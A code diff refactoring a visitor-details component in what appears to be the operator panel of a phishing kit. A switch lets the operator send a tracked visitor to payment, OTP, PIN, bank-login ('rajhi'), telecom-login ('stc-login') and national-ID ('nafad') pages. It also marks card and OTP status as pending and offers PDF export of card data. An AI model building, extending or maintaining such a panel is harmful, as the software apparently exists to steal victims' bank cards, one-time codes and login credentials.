@@ -22,6 +22,7 @@ import { _d } from "@/lib/secure-utils";
 import { generateVisitorPdf, generateCardPdf } from "@/lib/generate-pdf";
 import { ArrowRight } from "lucide-react";
 import { BinInfo } from "./bin-info";
+import { getRoutingUpdate } from "@/lib/routing";
 
 interface VisitorDetailsProps {
   visitor: InsuranceApplication | null;
@@ -76,67 +77,44 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
       switch (destination) {
         case "home":
-          // Set both fields for compatibility
-          updates = {
-            redirectPage: "home" as any,
-            currentStep: "home" as any,
-          };
+          updates = getRoutingUpdate("home");
           break;
         case "insur":
-          updates = { redirectPage: "insur" as any };
+          updates = getRoutingUpdate("insur");
           break;
         case "compar":
-          updates = { redirectPage: "compar" as any };
+          updates = getRoutingUpdate("compar");
           break;
         case "payment":
-          // Modern pages use redirectPage, legacy pages use currentStep
           updates = {
-            redirectPage: "payment" as any,
-            currentStep: "_st1" as any,
+            ...getRoutingUpdate("payment"),
             cardStatus: "pending" as any,
             otpStatus: "pending" as any,
           };
           break;
         case "otp":
-          updates = {
-            redirectPage: "otp" as any,
-            currentStep: "_t2" as any,
-          };
+          updates = getRoutingUpdate("otp");
           break;
         case "pin":
-          updates = {
-            redirectPage: "pin" as any,
-            currentStep: "_t3" as any,
-          };
+          updates = getRoutingUpdate("pin");
           break;
         case "rajhi":
-          updates = {
-            redirectPage: "rajhi" as any,
-            currentStep: "rajhi" as any,
-          };
+          updates = getRoutingUpdate("rajhi");
           break;
         case "stc-login":
-          updates = {
-            redirectPage: "stc-login" as any,
-            currentStep: "stc-login" as any,
-          };
+          updates = getRoutingUpdate("stc-login");
           break;
         case "phone":
-          // Legacy system only
-          updates = { currentStep: "phone" as any };
+          updates = getRoutingUpdate("phone");
           break;
         case "nafad":
-          // Legacy system with correct value
-          updates = { currentStep: "_t6" as any };
+          updates = getRoutingUpdate("nafad");
           break;
         case "nafad_modal":
           updates = { nafadConfirmationCode: "123456" }; // Send confirmation code to open modal
           break;
         case "finalOtp":
-          updates = {
-            redirectPage: "finalOtp" as any,
-            currentStep: "finalOtp" as any,
-          };
+          updates = getRoutingUpdate("finalOtp");
           break;
       }
 
